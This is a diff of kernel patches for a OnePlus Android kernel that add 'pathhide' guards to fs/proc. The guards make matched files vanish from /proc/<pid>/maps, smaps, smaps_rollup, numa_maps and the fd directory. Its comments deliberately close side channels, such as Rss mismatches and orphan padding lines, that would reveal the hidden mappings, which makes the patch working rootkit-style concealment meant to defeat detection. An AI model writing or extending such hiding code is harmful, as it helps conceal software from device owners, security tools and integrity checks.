@@ -1,44 +1,171 @@
---- a/fs/proc/task_mmu.c
-+++ b/fs/proc/task_mmu.c
-@@ -329,6 +329,10 @@
- 	unsigned long start, end;
- 	dev_t dev = 0;
- 	const char *name = NULL;
-+	extern bool pathhide_match_file(struct file *file);
-+
-+	if (file && pathhide_match_file(file))
-+		return;
- 
- 	if (file) {
- 		struct inode *inode = file_inode(vma->vm_file);
-@@ -905,6 +909,10 @@
- {
- 	struct vm_area_struct *vma = v;
- 	struct mem_size_stats mss;
-+	extern bool pathhide_match_file(struct file *file);
-+
-+	if (vma->vm_file && pathhide_match_file(vma->vm_file))
-+		return 0;
- 
- 	memset(&mss, 0, sizeof(mss));
- 
+Hide pathhide-matched files from /proc/<pid>/maps, smaps, smaps_rollup,
+numa_maps and /proc/<pid>/fd (readdir, lookup, readlink and fdinfo).
 
+Generated hunk by hunk against the real tree the fleet pins for this kernel
+version:
+
+    OnePlusOSS/android_kernel_common_oneplus_sm8450 @ oneplus/sm8450_b_16.0_oneplus_10_pro
+
+and dry-run at fuzz 0 against every distinct fs/proc variant the manifests
+resolve to. A hunk that only lands "with fuzz" can silently guard the wrong
+function, so treat a fuzz report from `patch` as a failure and regenerate.
+
+Version notes:
+  * proc_readfd_count()/proc_fd_getattr() do not exist here, so there is no
+    kernel-supplied fd count for stat(/proc/<pid>/fd).st_size to leak -- that
+    fix is N/A on this version, not skipped.
+  * tid_fd_mode() takes a files_struct reference and uses fcheck_files(); the
+    file carries no reference, so the guard just drops it on the floor.
+  * show_map()/show_smap() are wrapped rather than guarded inline: on this tree
+    they open with get_pad_vma()/get_data_vma(), which hand back kzalloc'd
+    copies that only show_map_pad_vma() frees. An early return placed after
+    those declarations would leak two struct vm_area_struct per hidden padded
+    mapping, once per read of /proc/<pid>/maps.
+  * smaps_rollup iterates `for (vma = priv->mm->mmap; vma;)` with the advance
+    at the bottom of the body, so the guard suppresses the accumulation rather
+    than using `continue`, which would spin forever.
 --- a/fs/proc/fd.c
 +++ b/fs/proc/fd.c
-@@ -255,6 +255,7 @@
+@@ -109,12 +109,19 @@
+ {
+ 	struct files_struct *files = get_files_struct(task);
+ 	struct file *file;
++	extern bool pathhide_match_file(struct file *f);
+ 
+ 	if (!files)
+ 		return false;
+ 
+ 	rcu_read_lock();
+ 	file = fcheck_files(files, fd);
++	/* Hide matched fds from lookup, readlink and fdinfo, and from
++	 * d_revalidate so a cached dentry re-checks and vanishes too.
++	 * Filtering proc_readfd_common() alone leaves readlink(/proc/pid/fd/N)
++	 * returning the hidden path verbatim and fdinfo/N still openable. */
++	if (file && pathhide_match_file(file))
++		file = NULL;
+ 	if (file)
+ 		*mode = file->f_mode;
+ 	rcu_read_unlock();
+@@ -187,9 +194,13 @@
+ 		spin_lock(&files->file_lock);
+ 		fd_file = fcheck_files(files, fd);
+ 		if (fd_file) {
+-			*path = fd_file->f_path;
+-			path_get(&fd_file->f_path);
+-			ret = 0;
++			extern bool pathhide_match_file(struct file *f);
++
++			if (!pathhide_match_file(fd_file)) {
++				*path = fd_file->f_path;
++				path_get(&fd_file->f_path);
++				ret = 0;
++			}
+ 		}
+ 		spin_unlock(&files->file_lock);
+ 		put_files_struct(files);
+@@ -255,6 +266,7 @@
  	struct task_struct *p = get_proc_task(file_inode(file));
  	struct files_struct *files;
  	unsigned int fd;
-+	extern bool pathhide_match_file(struct file *file);
++	extern bool pathhide_match_file(struct file *f);
  
  	if (!p)
  		return -ENOENT;
-@@ -278,6 +279,8 @@
+@@ -277,6 +289,8 @@
+ 		f = fcheck_files(files, fd);
  		if (!f)
  			continue;
- 		data.mode = f->f_mode;
 +		if (pathhide_match_file(f))
 +			continue;
+ 		data.mode = f->f_mode;
  		rcu_read_unlock();
  		data.fd = fd;
+--- a/fs/proc/task_mmu.c
++++ b/fs/proc/task_mmu.c
+@@ -391,3 +391,26 @@
+ 
++static int ph_show_map(struct seq_file *m, void *v);
++
++/*
++ * pathhide: decided here rather than inside show_map_vma() for two reasons.
++ * show_map_pad_vma() emits a second, synthesized VMA for a 16kB-compat padded
++ * mapping and that pad is anonymous (vm_file == NULL), so a guard further in
++ * would leave an orphan "[page size compat]" line behind a hidden .so --
++ * present in maps, absent from smaps, which is the mismatch itself. Deciding
++ * before the body runs also means get_pad_vma()/get_data_vma() are never
++ * called, so on trees where they hand back heap copies (freed by
++ * show_map_pad_vma()) an early return cannot leak them.
++ */
+ static int show_map(struct seq_file *m, void *v)
++{
++	extern bool pathhide_match_file(struct file *f);
++	struct vm_area_struct *vma = v;
++
++	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++		return 0;
++
++	return ph_show_map(m, v);
++}
++
++static int ph_show_map(struct seq_file *m, void *v)
+ {
+@@ -932,3 +955,26 @@
+ 
++static int ph_show_smap(struct seq_file *m, void *v);
++
++/*
++ * pathhide: decided here rather than inside show_map_vma() for two reasons.
++ * show_map_pad_vma() emits a second, synthesized VMA for a 16kB-compat padded
++ * mapping and that pad is anonymous (vm_file == NULL), so a guard further in
++ * would leave an orphan "[page size compat]" line behind a hidden .so --
++ * present in maps, absent from smaps, which is the mismatch itself. Deciding
++ * before the body runs also means get_pad_vma()/get_data_vma() are never
++ * called, so on trees where they hand back heap copies (freed by
++ * show_map_pad_vma()) an early return cannot leak them.
++ */
+ static int show_smap(struct seq_file *m, void *v)
++{
++	extern bool pathhide_match_file(struct file *f);
++	struct vm_area_struct *vma = v;
++
++	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++		return 0;
++
++	return ph_show_smap(m, v);
++}
++
++static int ph_show_smap(struct seq_file *m, void *v)
+ {
+@@ -1073,7 +1119,15 @@
+ 	hold_task_mempolicy(priv);
+ 
+ 	for (vma = priv->mm->mmap; vma;) {
+-		smap_gather_stats(vma, &mss, 0);
++		extern bool pathhide_match_file(struct file *f);
++		bool ph_hidden = vma->vm_file &&
++				 pathhide_match_file(vma->vm_file);
++
++		/* smaps_rollup accumulates on its own and never
++		 * consulted pathhide, so sum(smaps Rss) != rollup Rss
++		 * for a hidden mapping -- a zero-privilege oracle. */
++		if (!ph_hidden)
++			smap_gather_stats(vma, &mss, 0);
+ 		last_vma_end = vma->vm_end;
+ 
+ 		/*
+@@ -2089,6 +2143,15 @@
+ 	if (!mm)
+ 		return 0;
+ 
++	{
++		/* numa_maps prints the backing path too; without this a
++		 * mapping hidden from maps is still named here. */
++		extern bool pathhide_match_file(struct file *f);
++
++		if (file && pathhide_match_file(file))
++			return 0;
++	}
++
+ 	/* Ensure we start with an empty set of numa_maps statistics. */
+ 	memset(md, 0, sizeof(*md));
  
